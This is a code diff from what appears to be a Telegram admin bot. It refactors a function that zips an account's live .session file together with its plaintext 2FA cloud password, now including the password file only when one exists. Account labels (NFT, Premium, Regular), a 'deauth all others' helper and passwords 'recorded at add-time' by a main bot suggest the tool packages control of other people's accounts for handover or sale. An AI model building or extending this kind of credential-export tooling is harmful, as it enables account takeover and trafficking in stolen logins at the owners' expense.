@@ -11,6 +11,7 @@ from adminclient import admin_app
 from adminconfig import ADMIN_IDS, OWNER_ID, logger
 import adminstore
 from session_tools import build_session_file, classify_account, deauth_all_others
+from zip_utils import build_export_zip
 from uiadmin import (
     get_admin_keyboard, cancel_keyboard, build_list_view,
     account_label, get_stats_text,
@@ -82,16 +83,12 @@ async def _export_one(chat_id: int, acc: dict):
     workdir = tempfile.mkdtemp(prefix="vex_")
     try:
         session_path = build_session_file(acc["session"], os.path.join(workdir, safe))
-        # 2fa.txt — the account's cloud password recorded at add-time.
-        # Empty file when the account has no 2FA (Telegram can't reveal an
-        # existing password, so this is always the value entered via the bot).
-        twofa_path = os.path.join(workdir, "2fa.txt")
-        with open(twofa_path, "w", encoding="utf-8") as tf:
-            tf.write(acc.get("twofa", "") or "")
+        # Bundle the .session and, ONLY when the account actually has a 2FA
+        # cloud password, a `2fa.txt` holding it. No-2FA accounts get NO file.
+        # (Telegram can't reveal an existing password, so this value is always
+        # the one recorded by the main bot at add-time.)
         zip_path = os.path.join(workdir, f"@{safe}.zip")
-        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
-            zf.write(session_path, arcname=f"{safe}.session")
-            zf.write(twofa_path, arcname="2fa.txt")
+        build_export_zip(zip_path, session_path, f"{safe}.session", acc.get("twofa", ""))
 
         badge = "💫 NFT" if acc["category"] == "nft" else ("⚡ Premium" if acc["category"] == "premium" else "👥 Regular")
         caption = (
